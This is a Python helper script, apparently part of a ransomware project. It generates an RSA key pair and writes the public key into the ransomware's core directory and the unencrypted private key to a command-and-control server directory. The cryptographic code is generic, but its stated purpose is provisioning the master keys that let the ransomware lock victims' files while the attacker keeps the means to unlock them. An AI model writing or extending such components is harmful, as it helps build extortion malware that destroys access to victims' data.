from cryptography.hazmat.primitives.asymmetric import rsa, padding as asymmetric_padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

RSA_KEY_SIZE_IN_BITS = 2048
RSA_PUBLIC_EXPONENT = 65537


class RSA:
    def __init__(self):
        self._backend = default_backend()
        self._private_key = rsa.generate_private_key(
            RSA_PUBLIC_EXPONENT, RSA_KEY_SIZE_IN_BITS, self._backend
        )
        self._public_key = self._private_key.public_key()

    @property
    def private_key(self):
        serialized_private_key = self._private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption(),
        )
        return serialized_private_key

    @property
    def public_key(self):
        serialized_public_key = self._public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        return serialized_public_key


# Make sure to execute this script from the helper_scripts directory or you will get path errors
if __name__ == "__main__":
    key_generator = RSA()

    public_key_path = "../ransomware/core/MASTER_PUBLIC_KEY"
    private_key_path = "../c_and_c_server/MASTER_PRIVATE_KEY"

    with open(public_key_path, "wb") as ransomware_public_key_file:
        ransomware_public_key_file.write(key_generator.public_key)
    with open(private_key_path, "wb") as c_and_c_private_key_file:
        c_and_c_private_key_file.write(key_generator.private_key)

